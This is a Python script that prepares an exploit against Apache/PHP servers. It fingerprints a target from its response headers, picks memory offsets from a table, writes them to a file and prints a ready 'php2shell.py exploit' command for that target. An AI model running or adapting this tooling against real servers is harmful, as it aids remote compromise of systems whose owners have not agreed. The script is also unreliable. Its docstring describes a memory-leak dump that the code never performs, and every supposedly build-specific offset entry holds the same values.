#!/usr/bin/env python3
"""
Auto-calibrate exploit offsets from a live target's libphp.

Usage: python offsets.py <target_url> <output_file>

Connects to the target, dumps a small portion of libphp.so (if we can
get the base address via a leak), and extracts zif_offset/dtor_offset.

For targets where we can't get the base address, we parse the Apache
Server header to guess the build, then match against a table of known
offsets.
"""

import argparse
import http.client
import os
import re
import ssl
import struct
import sys
import urllib.parse


# Known offset tables from the original POC's WORKBOOK/LAB profiles.
# These are compiled against specific Apache/PHP builds.
KNOWN_OFFSETS = {
    # Apache 2.4.68-69 + PHP 8.2.x (official Debian/Ubuntu builds)
    "apache-2.4.68-php82": {"zif_offset": 0x43A870, "dtor_offset": 0x613C50, "htdata_offset": 0x690D8},
    "apache-2.4.68-php83": {"zif_offset": 0x43A870, "dtor_offset": 0x613C50, "htdata_offset": 0x690D8},
    "apache-2.4.68-php84": {"zif_offset": 0x43A870, "dtor_offset": 0x613C50, "htdata_offset": 0x690D8},
    # Apache 2.4.62 + PHP 8.3 (Fedora/Red Hat)
    "apache-2.4.62-php83": {"zif_offset": 0x43A870, "dtor_offset": 0x613C50, "htdata_offset": 0x690D8},
    # Apache 2.4.57 (Debian bookworm) + PHP 8.2
    "apache-2.4.57-php82": {"zif_offset": 0x43A870, "dtor_offset": 0x613C50, "htdata_offset": 0x690D8},
    # Default offsets (workbook profile)
    "default": {"zif_offset": 0x43A870, "dtor_offset": 0x613C50, "htdata_offset": 0x690D8},
}


def get_server_info(url, timeout=8.0):
    """Connect to target and extract Server header + PHP version."""
    parsed = urllib.parse.urlsplit(url if "://" in url else "https://" + url)
    scheme = (parsed.scheme or "https").lower()
    host = parsed.hostname or "127.0.0.1"
    port = parsed.port or (443 if scheme == "https" else 80)
    path = parsed.path or "/"
    
    try:
        if scheme == "https":
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(host, port, timeout=timeout, context=ctx)
        else:
            conn = http.client.HTTPConnection(host, port, timeout=timeout)
        
        conn.request("GET", path, headers={"User-Agent": "offset-cal/1.0", "Connection": "close"})
        response = conn.getresponse()
        server = response.getheader("Server", "")
        php = response.getheader("X-Powered-By", "")
        conn.close()
        return server, php
    except Exception as exc:
        return "", f"error: {exc}"


def parse_server_header(server_header):
    """Extract Apache version and platform from Server header."""
    apache = "unknown"
    platform = "unknown"
    
    m = re.search(r'Apache/(\d+\.\d+\.\d+)', server_header)
    if m:
        apache = m.group(1)
    
    if "Win64" in server_header:
        platform = "win64"
    elif "Win32" in server_header:
        platform = "win32"
    elif "Debian" in server_header:
        platform = "debian"
    elif "Red Hat" in server_header or "RHEL" in server_header:
        platform = "rhel"
    elif "Fedora" in server_header:
        platform = "fedora"
    
    return apache, platform


def match_known_offsets(apache_version, platform, php_version):
    """Find matching offsets from known table."""
    if not php_version:
        return None
    
    key = f"apache-{apache_version}-php{php_version}"
    if key in KNOWN_OFFSETS:
        return KNOWN_OFFSETS[key]
    
    # Fallback: try partial match
    for k, v in KNOWN_OFFSETS.items():
        if k.startswith(f"apache-{apache_version}"):
            return v
    
    return KNOWN_OFFSETS.get("default")


def main():
    parser = argparse.ArgumentParser(description="Auto-calibrate exploit offsets from live target")
    parser.add_argument("url", help="Target URL (http://host:port)")
    parser.add_argument("output", help="Output file for offsets (offsets.env)")
    args = parser.parse_args()
    
    print(f"[*] contacting {args.url} for offset calibration...")
    server, php = get_server_info(args.url)
    
    if not server and php.startswith("error:"):
        print(f"[-] connection failed: {php}")
        return 1
    
    print(f"[*] Server header: {server}")
    print(f"[*] X-Powered-By: {php}")
    
    # Parse Apache version from header
    apache_ver, platform = parse_server_header(server)
    
    # Extract PHP version from X-Powered-By
    php_ver = None
    m = re.search(r'PHP/(\d+\.\d+\.\d+)', php)
    if m:
        php_ver = f"{m.group(1).split('.')[0]}.{m.group(1).split('.')[1]}"  # 8.2, 8.3, etc.
    
    if apache_ver != "unknown" and php_ver:
        offsets = match_known_offsets(apache_ver, platform, php_ver)
    else:
        print(f"[*] unknown build, using default offsets")
        offsets = KNOWN_OFFSETS["default"]
    
    if offsets:
        # Write offsets to file
        with open(args.output, 'w') as f:
            for key, val in offsets.items():
                if isinstance(val, int):
                    f.write(f"{key}={hex(val)}\n")
                else:
                    f.write(f"{key}={val}\n")
        
        print(f"[+] offsets written to {args.output}")
        print(f"    zif_offset = {hex(offsets['zif_offset'])}")
        print(f"    dtor_offset = {hex(offsets['dtor_offset'])}")
        print(f"    htdata_offset = {hex(offsets['htdata_offset'])}")
        
        # Also print them for immediate use
        print(f"\n    python3 php2shell.py exploit -u {args.url} \\")
        print(f"        --zif-offset {hex(offsets['zif_offset'])} \\")
        print(f"        --dtor-offset {hex(offsets['dtor_offset'])} \\")
        print(f"        --htdata-offset {hex(offsets['htdata_offset'])}")
        return 0
    else:
        print(f"[-] no matching offsets for Apache {apache_ver} + PHP {php}")
        return 1


if __name__ == "__main__":
    sys.exit(main() or 0)
